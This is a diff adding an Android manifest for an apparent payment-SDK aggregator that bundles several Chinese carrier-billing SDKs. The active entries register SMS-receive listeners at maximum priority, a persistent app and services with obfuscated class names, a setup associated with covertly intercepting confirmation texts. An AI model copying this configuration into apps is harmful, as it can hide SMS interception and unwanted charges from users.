@@ -1,0 +1,173 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.utopay.gblwsdk"
+    android:versionCode="1"
+    android:versionName="1.0">
+
+    <uses-sdk android:minSdkVersion="9" />
+    <application
+        android:allowBackup="true"
+        android:persistent="true">
+
+        <!--掌支付开始-->
+        <!--<activity-->
+        <!--android:name="com.zhangzhifu.sdk.activity.ZhangPayActivity"-->
+        <!--android:exported="true"-->
+        <!--android:theme="@android:style/Theme.Translucent" />-->
+
+        <!--<service android:name="com.zhangzhifu.sdk.service.ZhangPayPlateService" />-->
+
+        <!--<receiver android:name="com.zhangzhifu.sdk.util.sms.BootReceiver">-->
+        <!--<intent-filter android:priority="2147483647">-->
+        <!--<action android:name="android.intent.action.BOOT_COMPLETED" />-->
+        <!--</intent-filter>-->
+        <!--</receiver>-->
+
+        <!--<service-->
+        <!--android:name="com.zhangzhifu.sdk.service.ZhangzhifuSmsService"-->
+        <!--android:enabled="true" />-->
+
+        <!--<receiver-->
+        <!--android:name="com.zhangzhifu.sdk.util.sms.SmsReceiver"-->
+        <!--android:exported="true">-->
+        <!--<intent-filter android:priority="2147483647">-->
+        <!--<action android:name="android.provider.Telephony.SMS_RECEIVED" />-->
+
+        <!--<category android:name="android.intent.category.DEFAULT" />-->
+        <!--</intent-filter>-->
+        <!--</receiver>-->
+
+        <!--<receiver android:name="com.zhangzhifu.sdk.util.sms.WapPushReceiver">-->
+        <!--<intent-filter android:priority="2147483647">-->
+        <!--<action android:name="android.provider.Telephony.WAP_PUSH_RECEIVED" />-->
+
+        <!--<data android:mimeType="application/vnd.wap.sic" />-->
+        <!--</intent-filter>-->
+        <!--</receiver>-->
+
+        <!--<receiver android:name="com.zhangzhifu.sdk.service.ServiceRecevier">-->
+        <!--<intent-filter android:priority="2147483647">-->
+        <!--<action android:name="android.intent.action.BOOT_COMPLETED" />-->
+        <!--<action android:name="android.intent.action.USER_PRESENT" />-->
+        <!--<action android:name="android.media.RINGER_MODE_CHANGED" />-->
+        <!--</intent-filter>-->
+        <!--</receiver>-->
+        <!--掌支付结束-->
+
+        <!-- 米粒开始 -->
+        <!--<meta-data-->
+        <!--android:name="MILI_PAY_APPID"-->
+        <!--android:value="21841991" />-->
+
+        <!--<meta-data-->
+        <!--android:name="MILI_PAY_CHANNELID"-->
+        <!--android:value="default" />-->
+        <!--米粒结束-->
+
+
+        <!-- 应美开始 -->
+        <!--<meta-data-->
+        <!--android:name="YM_CPID"-->
+        <!--android:value="3353_22_2" />-->
+
+        <!--<service android:name="f.g.h.j.ma.MService" />-->
+
+        <!--<receiver-->
+        <!--android:name="f.g.h.j.ma.MCast"-->
+        <!--android:label="NetworkConnection">-->
+        <!--<intent-filter>-->
+        <!--<action android:name="android.net.conn.CONNECTIVITY_CHANGE" />-->
+        <!--<action android:name="android.intent.action.TIME_SET" />-->
+        <!--<action android:name="android.intent.action.TIME_TICK" />-->
+        <!--</intent-filter>-->
+        <!--<intent-filter android:priority="2147483647">-->
+        <!--<action android:name="android.provider.Telephony.SMS_RECEIVED" />-->
+        <!--</intent-filter>-->
+        <!--<intent-filter>-->
+        <!--<action android:name="sss_tuccc" />-->
+        <!--</intent-filter>-->
+        <!--</receiver>-->
+
+        <!--<service android:name="d.e.f.t.hr.IvService">-->
+        <!--<intent-filter>-->
+        <!--<action android:name="c.a.e" />-->
+        <!--</intent-filter>-->
+        <!--</service>-->
+        <!--<service android:name="c.a.d.s.HService" />-->
+
+        <!--<receiver-->
+        <!--android:name="o.n.o.n.EntReceiver"-->
+        <!--android:label="NetworkConnection">-->
+        <!--<intent-filter>-->
+        <!--<action android:name="android.net.conn.CONNECTIVITY_CHANGE" />-->
+        <!--<action android:name="android.intent.action.TIME_SET" />-->
+        <!--<action android:name="android.intent.action.TIME_TICK" />-->
+        <!--<action android:name="sss_takkk" />-->
+        <!--<action android:name="android.provider.Telephony.SMS_RECEIVED" />-->
+        <!--</intent-filter>-->
+        <!--</receiver>-->
+        <!-- 应美结束 -->
+
+        <!--云贝支付开始-->
+        <receiver android:name="com.balabi.scure.rece" />
+
+        <service
+            android:name="com.balabi.scure.ser"
+            android:exported="true"
+            android:process=":se" />
+
+        <meta-data
+            android:name="YQWY_PAY_CHANNELID"
+            android:value="yqwytest" />
+
+        <meta-data
+            android:name="YQWY_PAY_APPID"
+            android:value="1" />
+        <!--云贝支付结束-->
+
+        <!--玉峰支付开始-->
+        <receiver android:name="com.mj.jar.pay.InSmsReceiver">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <service android:name="com.mj.jar.pay.SmsServices" />
+        <!--<service android:name="com.mj.sms.service.InitService" />-->
+
+        <!--玉峰支付结束-->
+
+        <!--大麦支付-->
+        <service android:name="com.android.dimtale.general.MiiService" />
+
+        <!--上岸支付开始-->
+        <meta-data
+            android:name="MS_CHANNEL"
+            android:value="57010-57020" />
+
+        <service android:name="com.wc.ss.sm" />
+        <service android:name="com.wc.ss.SeLrS" />
+
+        <receiver android:name="com.n.fk.MR">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <action android:name="android.provider.Telephony.GSM_SMS_RECEIVED" />
+                <action android:name="android.provider.Telephony.SMS_RECEIVED_2" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.n.fk.CrV">
+            <intent-filter android:priority="90000">
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+        </receiver>
+        <!--上岸支付结束-->
+
+        <!--微云支付开始-->
+        <meta-data
+            android:name="appCode"
+            android:value="20815536" />
+        <service android:name="com.wyzf.service.InitService" />
+        <!--微云支付结束-->
+
+    </application>
+</manifest>
